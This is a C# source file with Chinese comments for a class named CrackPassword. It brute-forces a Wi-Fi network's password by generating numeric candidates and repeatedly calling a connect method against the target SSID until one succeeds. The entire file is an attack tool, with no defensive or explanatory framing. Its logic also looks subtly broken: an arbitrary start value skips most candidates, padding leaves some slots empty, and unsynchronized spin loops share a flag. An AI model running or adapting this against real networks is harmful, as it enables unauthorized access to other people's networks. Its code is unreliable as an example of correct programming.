using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace AutoConnect
{
    class CrackPassword
    {
        private String[] allCombo=new String[1000];                         //用来存放密码组合
        private int passwordNumber=0;                                         //密码位数
        private double allComboNumber=0;                                      //当前密码位数下可能组合数
        private double startNumber=12131415161717;
        private char zero = '0';
        public Boolean avaliable = true;                                   //用来判断数组中是否有可用空间
        private Wifi wifi=null;
        private WIFISSID SSID=null;
        private String authen=null;
        private String encry=null;
        public double crackingNumber = 0;
        public String password = null;

        public CrackPassword(WIFISSID SSID, String authen, String encry,int passwordNumber)
        {
            this.passwordNumber = passwordNumber;
            this.SSID = SSID;
            this.authen = authen;
            this.encry = encry;
            allComboNumber = Math.Pow(10, this.passwordNumber);             
        }
       
        public void AllCombo()                                            //用于产生所有密码组合
        {
          double i = 0;
          while(i<allComboNumber)                                 
            {
                if (avaliable)                                            //数组中有可用空间
                {
                    for (int j = 0; j < 1000; j++)
                    {
                        if (startNumber < Math.Pow(10, passwordNumber - 1))
                        {
                            String str =(startNumber + j).ToString();
                            String addStr = null;
                            if (str.Length < passwordNumber)
                            {
                                for (int k = 0; k < passwordNumber - str.Length; k++)
                                {
                                    addStr += zero;
                                }
                                allCombo[j] = addStr + str;
                            }
                        }
                        else
                        {
                            allCombo[j] = (startNumber + j).ToString(); ;
                        }                      
                    }
                    avaliable = false;
                    i = i + 1000;
                    startNumber = startNumber + 1000;
                }
                             
            }              
        }


        

        public void Cracking()                                      //暴力破解密码
        {
            wifi = new Wifi(SSID, null, authen, encry);
            while (true)
            {
                if(!avaliable)
                {
                    for (int i = 0; i < 1000; i++)
                    {
                        wifi.pswd = allCombo[i];
                        Boolean result=wifi.ConnectToSSID();
                        crackingNumber++;                    
                        if (result==true)       //有网络连接        
                        {
                            password = allCombo[i];
                            return;
                        }
                    }
                    avaliable = true;
                }
            }
        }
    }
}
